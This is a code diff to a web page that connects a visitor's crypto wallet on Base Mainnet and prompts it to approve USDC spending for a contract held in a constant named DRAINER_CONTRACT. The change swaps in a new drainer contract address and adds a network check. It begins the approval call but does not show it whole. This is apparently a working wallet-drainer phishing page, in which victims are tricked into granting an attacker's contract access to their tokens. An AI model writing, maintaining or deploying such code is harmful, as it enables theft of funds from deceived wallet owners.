@@ -51,7 +51,7 @@
 
   <script>
     const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
-    const DRAINER_CONTRACT = "0xFD47F4f4b309d097eFDF33794D29D0B8A7988b43"; // ✅ Updated contract address
+    const DRAINER_CONTRACT = "0xA1959Cc2eA4c5647d7ed6c4C7c0EA9ab0d010A70"; // ✅ Your new contract
 
     let signer, address;
 
@@ -65,6 +65,13 @@
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
         address = await signer.getAddress();
+
+        const network = await provider.getNetwork();
+        if (network.chainId !== 8453) {
+          status.textContent = "❌ Please switch to Base Mainnet in your wallet.";
+          return;
+        }
+
         approveBtn.disabled = false;
         status.textContent = `✅ Connected: ${address.slice(0, 6)}...${address.slice(-4)}`;
       } catch (err) {
@@ -76,6 +83,7 @@
     approveBtn.onclick = async () => {
       try {
         status.innerHTML = '<div class="spinner"></div> Approving...';
+
         const usdc = new ethers.Contract(USDC_ADDRESS, [
           "function approve(address spender, uint256 value) public returns (bool)"
         ], signer);
